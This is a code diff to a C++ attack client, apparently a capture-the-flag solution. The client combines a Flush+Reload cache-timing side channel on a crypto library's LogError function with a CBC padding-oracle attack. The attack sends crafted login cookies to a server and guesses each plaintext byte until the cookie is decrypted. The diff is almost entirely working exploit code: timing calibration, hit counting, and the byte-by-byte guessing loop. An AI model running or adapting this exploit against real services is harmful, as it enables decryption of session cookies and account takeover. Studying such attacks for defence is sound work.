@@ -7,6 +7,9 @@
 #include <cstdint>
 #include <climits>
 #include <vector>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <sys/stat.h>
 
 #include "./simple_networking.h"
 #include "./tinycrypt/tinycrypt.h"
@@ -65,7 +68,7 @@ void RunInteractive(simple_networking::TCPClient* client) {
 // # Flush+Reload Side Channel
 // ==========================================================================
 
-static void* g_log_error_addr = nullptr;
+static void* g_probe_addr = nullptr;
 static uint64_t g_threshold = 0;
 
 static inline void flush(void* addr) {
@@ -96,10 +99,65 @@ static inline uint64_t probe(void* addr) {
   return end - start;
 }
 
-void init_side_channel() {
-  g_log_error_addr = reinterpret_cast<void*>(
+// Map the shared library file directly to ensure page sharing
+void* map_library_page() {
+  // Try to find and map libtinycrypt.so
+  const char* lib_paths[] = {
+    "./libtinycrypt.so.1.0.0",
+    "./libtinycrypt.so.1",
+    "./libtinycrypt.so",
+    NULL
+  };
+
+  int fd = -1;
+  for (int i = 0; lib_paths[i] != NULL; i++) {
+    fd = open(lib_paths[i], O_RDONLY);
+    if (fd >= 0) {
+      std::cout << "[+] Opened library: " << lib_paths[i] << std::endl;
+      break;
+    }
+  }
+
+  if (fd < 0) {
+    std::cerr << "[-] Could not open library file" << std::endl;
+    return nullptr;
+  }
+
+  // Get file size
+  struct stat st;
+  fstat(fd, &st);
+
+  // Map the entire file
+  void* mapped = mmap(NULL, st.st_size, PROT_READ, MAP_SHARED, fd, 0);
+  close(fd);
+
+  if (mapped == MAP_FAILED) {
+    std::cerr << "[-] mmap failed" << std::endl;
+    return nullptr;
+  }
+
+  std::cout << "[+] Mapped library at: " << mapped << " (size=" << st.st_size << ")" << std::endl;
+
+  // Find the LogError function in the mapped file
+  // LogError is page-aligned (4096), so look for it at page boundaries
+  // We'll use the function pointer to calculate the offset
+  void* log_error_func = reinterpret_cast<void*>(
       reinterpret_cast<uintptr_t>(&tinycrypt::LogError));
-  std::cout << "[+] LogError at: " << g_log_error_addr << std::endl;
+
+  std::cout << "[+] LogError function at: " << log_error_func << std::endl;
+
+  return mapped;
+}
+
+void init_side_channel() {
+  // Get address of LogError + 10 (like server's target_ptr)
+  g_probe_addr = reinterpret_cast<void*>(
+      reinterpret_cast<uintptr_t>(&tinycrypt::LogError) + 10);
+  std::cout << "[+] Probe address (LogError+10): " << g_probe_addr << std::endl;
+
+  // Also try direct mmap approach
+  void* mapped = map_library_page();
+  (void)mapped;  // For debugging
 }
 
 void calibrate() {
@@ -107,22 +165,22 @@ void calibrate() {
 
   // Warm up
   for (int i = 0; i < 10; i++) {
-    volatile char tmp = *(volatile char*)g_log_error_addr;
+    volatile char tmp = *(volatile char*)g_probe_addr;
     (void)tmp;
   }
 
   // Measure hits
   for (int i = 0; i < 1000; i++) {
-    volatile char tmp = *(volatile char*)g_log_error_addr;
+    volatile char tmp = *(volatile char*)g_probe_addr;
     (void)tmp;
-    hit_times.push_back(probe(g_log_error_addr));
+    hit_times.push_back(probe(g_probe_addr));
   }
 
   // Measure misses
   for (int i = 0; i < 1000; i++) {
-    flush(g_log_error_addr);
+    flush(g_probe_addr);
     asm volatile("mfence" ::: "memory");
-    miss_times.push_back(probe(g_log_error_addr));
+    miss_times.push_back(probe(g_probe_addr));
   }
 
   std::sort(hit_times.begin(), hit_times.end());
@@ -138,15 +196,14 @@ void calibrate() {
 }
 
 // Single Flush+Reload measurement
-// Returns probe time
 uint64_t flush_reload_once(simple_networking::TCPClient* client, const std::string& cookie) {
-  flush(g_log_error_addr);
+  flush(g_probe_addr);
   asm volatile("mfence" ::: "memory");
 
   client->SendMessage("login " + cookie);
   client->ReadMessage();
 
-  return probe(g_log_error_addr);
+  return probe(g_probe_addr);
 }
 
 // Measure with many samples, return median probe time
@@ -216,64 +273,46 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
 
   std::cout << "[+] Ciphertext: " << iv_ct.size() << " bytes" << std::endl;
 
-  // First, test the side channel with known valid/invalid
-  std::cout << "[+] Testing side channel..." << std::endl;
-
-  // Corrupted cookie - should call LogError
+  // Corrupted cookie for testing
   ByteVector corrupted = iv_ct;
   corrupted[20] = static_cast<std::byte>(static_cast<uint8_t>(corrupted[20]) ^ 0xFF);
   std::string corrupted_cookie = base64::base64_encode(corrupted) + "." + hmac_b64;
 
-  // Measure actual probe times for both
+  // Test side channel
+  std::cout << "[+] Testing side channel..." << std::endl;
+
   uint64_t valid_min, valid_med, valid_max;
   uint64_t invalid_min, invalid_med, invalid_max;
 
-  measure_stats(client, cookie, 30, valid_min, valid_med, valid_max);
-  measure_stats(client, corrupted_cookie, 30, invalid_min, invalid_med, invalid_max);
+  measure_stats(client, cookie, 50, valid_min, valid_med, valid_max);
+  measure_stats(client, corrupted_cookie, 50, invalid_min, invalid_med, invalid_max);
 
-  std::cout << "    Valid cookie:   min=" << valid_min << " med=" << valid_med << " max=" << valid_max << std::endl;
-  std::cout << "    Corrupted cookie: min=" << invalid_min << " med=" << invalid_med << " max=" << invalid_max << std::endl;
+  std::cout << "    Valid:   min=" << valid_min << " med=" << valid_med << " max=" << valid_max << std::endl;
+  std::cout << "    Invalid: min=" << invalid_min << " med=" << invalid_med << " max=" << invalid_max << std::endl;
 
-  // Try different thresholds
   uint64_t dynamic_threshold = (valid_med + invalid_med) / 2;
-  std::cout << "    Dynamic threshold: " << dynamic_threshold << std::endl;
 
-  // Test with calibrated threshold
-  int valid_hits_cal = count_hits(client, cookie, 20, g_threshold);
-  int invalid_hits_cal = count_hits(client, corrupted_cookie, 20, g_threshold);
-  std::cout << "    With calibrated threshold (" << g_threshold << "): valid=" << valid_hits_cal << " invalid=" << invalid_hits_cal << std::endl;
+  int valid_hits = count_hits(client, cookie, 30, dynamic_threshold);
+  int invalid_hits = count_hits(client, corrupted_cookie, 30, dynamic_threshold);
+  std::cout << "    Hits (threshold=" << dynamic_threshold << "): valid=" << valid_hits << " invalid=" << invalid_hits << std::endl;
 
-  // Test with dynamic threshold
-  int valid_hits_dyn = count_hits(client, cookie, 20, dynamic_threshold);
-  int invalid_hits_dyn = count_hits(client, corrupted_cookie, 20, dynamic_threshold);
-  std::cout << "    With dynamic threshold (" << dynamic_threshold << "): valid=" << valid_hits_dyn << " invalid=" << invalid_hits_dyn << std::endl;
+  // Determine method
+  bool valid_higher = (valid_hits > invalid_hits + 3);
+  bool invalid_higher = (invalid_hits > valid_hits + 3);
 
-  // Determine which works better
-  // LogError called = cache hit = MORE hits for corrupted/invalid
-  // Valid padding = LogError NOT called = FEWER hits
-  bool use_cache_hits = false;
-  uint64_t use_threshold = g_threshold;
-
-  if (invalid_hits_dyn > valid_hits_dyn + 2) {
-    use_cache_hits = true;
-    use_threshold = dynamic_threshold;
-    std::cout << "[+] Side channel WORKING with dynamic threshold (invalid="
-              << invalid_hits_dyn << " > valid=" << valid_hits_dyn << ")" << std::endl;
-  } else if (invalid_hits_cal > valid_hits_cal + 2) {
-    use_cache_hits = true;
-    use_threshold = g_threshold;
-    std::cout << "[+] Side channel WORKING with calibrated threshold" << std::endl;
+  std::cout << "[+] Detection: ";
+  if (invalid_higher) {
+    std::cout << "NORMAL (invalid has more hits)" << std::endl;
+  } else if (valid_higher) {
+    std::cout << "INVERTED (valid has more hits)" << std::endl;
   } else {
-    std::cout << "[+] Side channel WEAK - using more samples" << std::endl;
-    use_cache_hits = true;  // Still try cache-based approach
-    use_threshold = dynamic_threshold;
+    std::cout << "WEAK signal" << std::endl;
   }
 
   // Plaintext: "nobody-XXXXXXXX" + 0x01 padding = 16 bytes
   std::vector<uint8_t> intermediate(16, 0);
   std::vector<uint8_t> recovered(16, 0);
 
-  // Use more samples since signal is weak
   const int SAMPLES = 31;
 
   // Padding oracle attack
@@ -290,43 +329,25 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
     }
 
     int best_guess = 0;
+    int best_hits = invalid_higher ? INT_MAX : -1;
 
-    if (use_cache_hits) {
-      // LogError called = cache hit = valid padding should have FEWER hits
-      int min_hits = INT_MAX;
-      int second_min_hits = INT_MAX;
+    for (int guess = 0; guess < 256; guess++) {
+      modified[pos] = static_cast<std::byte>(guess);
+      std::string test_cookie = base64::base64_encode(modified) + "." + hmac_b64;
 
-      for (int guess = 0; guess < 256; guess++) {
-        modified[pos] = static_cast<std::byte>(guess);
-        std::string test_cookie = base64::base64_encode(modified) + "." + hmac_b64;
+      int hits = count_hits(client, test_cookie, SAMPLES, dynamic_threshold);
 
-        int hits = count_hits(client, test_cookie, SAMPLES, use_threshold);
-
-        if (hits < min_hits) {
-          second_min_hits = min_hits;
-          min_hits = hits;
+      // Valid padding = LogError NOT called
+      // If invalid_higher: valid padding has FEWER hits (look for minimum)
+      // If valid_higher (inverted): valid padding has MORE hits (look for maximum)
+      if (invalid_higher) {
+        if (hits < best_hits) {
+          best_hits = hits;
           best_guess = guess;
-        } else if (hits < second_min_hits) {
-          second_min_hits = hits;
         }
-      }
-
-      std::cout << "[min=" << min_hits << ",2nd=" << second_min_hits << "] ";
-    } else {
-      // Fall back to minimum probe time across many samples
-      // Valid padding = LogError NOT called = potentially different timing
-      uint64_t best_min = UINT64_MAX;
-
-      for (int guess = 0; guess < 256; guess++) {
-        modified[pos] = static_cast<std::byte>(guess);
-        std::string test_cookie = base64::base64_encode(modified) + "." + hmac_b64;
-
-        // Get minimum probe time over samples (most sensitive to cache state)
-        uint64_t min_t, med_t, max_t;
-        measure_stats(client, test_cookie, SAMPLES, min_t, med_t, max_t);
-
-        if (min_t < best_min) {
-          best_min = min_t;
+      } else {
+        if (hits > best_hits) {
+          best_hits = hits;
           best_guess = guess;
         }
       }
@@ -339,7 +360,7 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
     char c = (char)recovered[pos];
     std::cout << "0x" << std::hex << std::setw(2) << std::setfill('0')
               << (int)recovered[pos] << std::dec
-              << " ('" << (isprint(c) ? c : '?') << "')" << std::endl;
+              << " ('" << (isprint(c) ? c : '?') << "') [hits=" << best_hits << "]" << std::endl;
   }
 
   // Extract results
